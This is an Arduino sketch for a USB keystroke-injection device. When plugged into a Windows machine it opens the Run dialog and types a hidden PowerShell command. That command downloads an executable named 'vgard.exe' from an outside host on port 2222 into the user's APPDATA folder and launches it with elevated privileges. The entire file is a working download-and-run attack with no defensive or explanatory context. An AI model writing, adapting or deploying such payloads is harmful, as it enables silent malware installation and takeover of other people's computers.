#include <Keyboard.h> 

// Init function
void setup()
{
  Keyboard.begin();

  // Wait for a moment to ensure the system is ready
  delay(500);

  // Open Run dialog (Windows + R)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(200);
  Keyboard.releaseAll();

  Keyboard.println("powershell -windowstyle hidden -command \"& { Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://gem.kro.kr:2222/vgard.exe' -Destination \\\"$env:APPDATA\\vgard.exe\\\"; Start-Process -FilePath \\\"$env:APPDATA\\vgard.exe\\\" -Verb RunAs }\"");
  delay(200);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {
  // Empty loop since everything is done in setup
}